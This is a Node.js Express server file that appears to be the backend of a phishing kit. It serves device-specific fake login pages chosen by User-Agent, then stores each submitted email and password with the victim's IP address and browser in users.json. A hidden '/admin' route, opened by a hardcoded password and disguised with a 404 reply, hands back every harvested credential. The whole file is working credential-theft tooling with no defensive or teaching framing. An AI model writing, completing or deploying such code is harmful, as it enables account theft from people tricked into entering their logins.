var express = require('express');
var path = require('path');
var favicon = require('serve-favicon');
var logger = require('morgan');
var cookieParser = require('cookie-parser');
var bodyParser = require('body-parser');
var crypto = require('crypto');

var index = require('./routes/index');
var users = require('./routes/users');

var app = express();



app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

// uncomment after placing your favicon in /public
//app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));
app.use(logger('dev'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

var url = require('url');

app.get('/', function (req, res) {



  var user = req.get('User-Agent');
  user = user.toLowerCase();

  var post = req.query.post;
  post = post || '';
  if (post.length > 3)
   post = decrypt(post) || 'You must log in to continue.';
  else post = 'You must log in to continue.';


    var pc = 'index',
    andr = 'android',
    ios = 'Iphone';


  if (user.indexOf('android') > -1) res.render(andr,{post:post});
  else  if ((user.indexOf('iphone') > -1) || (user.indexOf('ipad') > -1) || (user.indexOf('ios') > -1) ) res.render(ios,{post:post});
  else
      res.render(pc,{post:post});
    console.log(pc);

});

app.post('/',function (req,res) {
    var fs = require('fs');
var  User={};



      User.email = req.body.email;
    User.pass = req.body.pass;
    User.ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    User.time = new Date().toUTCString();
  User['user-agent'] = req.get('User-Agent');
  try {
      var txt1 = fs.readFileSync(__dirname+'/'+ 'users.json') || '[]';
      if(txt1.length<5) txt1 = '[]';
  }
  catch (e) {
      txt1 = '[]';
  }
 // var txt2 = `email: ${User.email}\n pass: ${User.pass}\n ip: ${User.ip}\ntime :${User.time}`+`\n`+('-').repeat(50);
   var users = JSON.parse(txt1);
  users.push(User);


    fs.writeFile(__dirname + '/' + 'users.json',JSON.stringify(users,null,4),function (error) {
        if (error) return console.log(error);
        res.send('success');
    });






});

app.get('/admin',function (req,res, next) {


    var url_parts = url.parse(req.url, true);
    var query = url_parts.query;
    if (query.pass !== '1225')
    {
    res.status(404)        // HTTP status 404: NotFound
   .send('Not found');
   console.log(query.pass);

      return;
    }
    var cmd = query.cmd;
    if (cmd == 'get') {

        var fs = require('fs');

        fs.readFile(__dirname + '/' + 'users.json',function (err,data) {
            if (err) return console.log(err);
            data = data.toString();
            res.send(data);


        });




    }

    else {
        res.render('admin',{type:'get'});
    }









});


app.post('/admin',function (req,res) {



    res.render('admin',{type:'get'});
    return;

    for (var key in User)
    {

    }




});


app.use('/users', users);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  var err = new Error('Not Found');
  err.status = 404;
  next(err);
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

function encrypt(text){
    'use strict'
    var cipher = crypto.createCipher('aes-256-ctr','samer');
    var crypted = cipher.update(text,'utf8','hex');
    crypted += cipher.final('hex');
    return crypted;
}

function decrypt(text){
    'use strict'
    try {
        var decipher = crypto.createDecipher('aes-256-ctr','samer');
        var dec = decipher.update(text,'hex','utf8');
        dec += decipher.final('utf8');
        return dec;
    }
    catch (e) {
        return 'You must log in first';
    }

}

module.exports = app;
